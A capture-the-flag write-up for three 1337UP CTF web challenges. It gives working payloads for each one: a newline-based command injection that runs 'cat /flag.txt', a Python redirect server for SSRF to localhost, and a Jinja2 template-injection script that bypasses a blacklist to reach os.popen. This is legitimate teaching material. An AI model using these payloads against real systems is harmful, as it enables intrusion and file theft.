# 1337UP CTF

1. Command injection -> %0d%0a
2. SSRF -> redirecting
3. SSTI -> flask bypass blacklist

## Traveler
```
POST /package2-details.php
pack=Single'%20or1=1--%20-&submit=Submit
```
An error occurred whilst executing: bash check.sh Single' or 1=1--

```
POST /package2-details.php
pack=Single%0d%0acat%20/flag.txt&submit=Submit
```

**flag**: `1337UP{C0MM4nd_Inj3ti0n}`
## Dead Tube
https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery

SSRF bypass request local by redirecting.

```python
#!/usr/bin/env python3

#python3 ./server.py 8000 http://127.0.0.1/

import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 2:
    print("Usage: {} <port_number> <url>".format(sys.argv[0]))
    sys.exit()

class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       self.send_response(302)
       self.send_header('Location', sys.argv[2] + ':8080/flag') # redirect to this path
       self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```
Using `ngrok` to tunnel

**flag**: `1337UP{SSRF_AINT_GOT_NOTHING_ON_M3}`

## 1 truth, 2 lies

https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/

```python
import requests

url = 'https://1truth2lies.ctf.intigriti.io'

path = """/
 ▄█    ▄▄▄▄███▄▄▄▄         ▄█    █▄  ███    █▄   ▄█       ███▄▄▄▄      ▄████████    ▄████████    ▄████████ ▀█████████▄   ▄█          ▄████████ 
███  ▄██▀▀▀███▀▀▀██▄      ███    ███ ███    ███ ███       ███▀▀▀██▄   ███    ███   ███    ███   ███    ███   ███    ███ ███         ███    ███ 
███▌ ███   ███   ███      ███    ███ ███    ███ ███       ███   ███   ███    █▀    ███    ███   ███    ███   ███    ███ ███         ███    █▀  
███▌ ███   ███   ███      ███    ███ ███    ███ ███       ███   ███  ▄███▄▄▄      ▄███▄▄▄▄██▀   ███    ███  ▄███▄▄▄██▀  ███        ▄███▄▄▄     
███▌ ███   ███   ███      ███    ███ ███    ███ ███       ███   ███ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   ▀███████████ ▀▀███▀▀▀██▄  ███       ▀▀███▀▀▀     
███  ███   ███   ███      ███    ███ ███    ███ ███       ███   ███   ███    █▄  ▀███████████   ███    ███   ███    ██▄ ███         ███    █▄  
███  ███   ███   ███      ███    ███ ███    ███ ███▌    ▄ ███   ███   ███    ███   ███    ███   ███    ███   ███    ███ ███▌    ▄   ███    ███ 
█▀    ▀█   ███   █▀        ▀██████▀  ████████▀  █████▄▄██  ▀█   █▀    ██████████   ███    ███   ███    █▀  ▄█████████▀  █████▄▄██   ██████████ 
                                                ▀                                  ███    ███                           ▀"""
# pipe attribute, python support literal hex encoding
r =requests.get(url+path, params={
    'input': r"{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat /*')|attr('read')()}}"
    })

print(r.text)
```

**flag**: `flag{1ea5n_h0w_vu1n_h1ppen_and_wh1t_l1ne_m1ke_vu1n!!!}`
